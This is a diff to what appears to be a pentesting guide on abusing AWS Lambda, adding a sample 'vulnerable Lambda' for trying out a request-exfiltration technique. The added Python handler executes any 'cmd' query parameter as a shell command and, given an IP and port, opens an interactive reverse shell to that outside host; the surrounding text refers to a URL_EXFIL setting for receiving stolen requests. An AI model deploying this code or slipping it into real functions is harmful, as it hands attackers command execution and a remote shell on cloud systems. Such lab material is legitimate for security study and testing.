@@ -33,3 +33,35 @@ EOF
 ```
 
 Note how it's possible to indicate in the env variable `URL_EXFIL` the URL where you want to receive the exfiltrated requests.
+
+
+If you want to try it you can create a vulnerable Lambda with a code such as:
+
+```python
+import json
+import os
+def lambda_handler(event, context):
+    data = "hello"
+    if event["queryStringParameters"].get("cmd"):
+        data = os.popen(event["queryStringParameters"]["cmd"]).read()
+    
+    elif event["queryStringParameters"].get("ip") and event["queryStringParameters"].get("port"):
+        rev_shell(event["queryStringParameters"]["ip"], int(event["queryStringParameters"]["port"]))
+        data = "called rev shell"
+    
+    return {
+        'statusCode': 200,
+        'body': json.dumps(data)
+    }
+
+def rev_shell(ip, port):
+    import socket
+    import subprocess
+    import os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip,int(port)))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/sh","-i"])
+```
